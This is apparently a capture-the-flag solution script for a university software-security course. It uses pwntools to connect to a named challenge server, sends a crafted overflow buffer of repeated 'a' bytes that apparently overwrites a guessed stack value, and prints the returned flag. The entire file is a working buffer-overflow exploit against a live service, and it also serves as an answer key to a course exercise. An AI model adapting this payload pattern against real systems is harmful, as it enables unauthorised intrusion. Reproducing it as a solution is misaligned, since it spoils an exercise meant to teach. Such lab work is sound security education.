from pwn import remote

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 23161

remote = remote(SERVER, PORT, timeout=10000)

guess = b"a" * 8
buffer = guess + b"a" * 40 + guess + b"\n"

remote.sendline(buffer)
flag = remote.recvline_contains(b"SSof{")
print(flag.decode().split()[-1])